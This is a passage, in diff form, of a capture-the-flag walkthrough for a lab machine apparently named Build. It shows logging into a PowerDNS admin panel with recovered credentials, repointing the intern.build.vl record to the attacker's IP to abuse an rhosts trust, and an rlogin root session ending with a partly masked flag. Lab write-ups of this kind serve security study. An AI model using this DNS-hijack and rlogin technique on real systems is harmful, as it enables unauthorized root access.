@@ -828,3 +828,90 @@ With these credentials we log into the `powerdns` admin pannel: `admin:winston`
 ![10](../../../assets/images/Build/10.png)
 
 <br />
+
+The `build.vl` zone displays all subdomains of the internal network with their respective IP addresses:
+
+<br />
+
+![11](../../../assets/images/Build/11.png)
+
+<br />
+
+## Rlogin - intern.build.vl
+
+<br />
+
+If we remember, the `rhosts` file noticed us that there are two allowed subdomains to connect via `rlogin` to the principal host. One of this subdomains was `intern.build.vl`.
+
+This subdomain is available in the Zone records above. We can edit the record for `intern` by making it point to our IP address and next attempt to connect as root using `rlogin`.
+
+We proceed to edit the record:
+
+<br />
+
+![12](../../../assets/images/Build/12.png)
+
+<br />
+
+Finally, we connect as root:
+
+<br />
+
+```bash
+❯ rlogin root@10.129.234.169
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-144-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri Jan  9 01:10:34 PM UTC 2026
+
+  System load:  0.0               Processes:             197
+  Usage of /:   64.1% of 9.75GB   Users logged in:       0
+  Memory usage: 33%               IPv4 address for eth0: 10.129.234.169
+  Swap usage:   0%
+
+  => There is 1 zombie process.
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+1 update can be applied immediately.
+1 of these updates is a standard security update.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+root@build:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+<br />
+
+It worked.
+
+With a root session we retrieve the `root.txt` flag:
+
+<br />
+
+```bash
+root@build:~# cat root.txt 
+b7b1e48179891ea87e77b1f83bxxxxxx
+```
+
+<br />
+
+Machine rooted.
+
+I hope your learned and enjoyed this writeup.
+
+Keep Hacking! ❤️❤️
+
+<br />
+
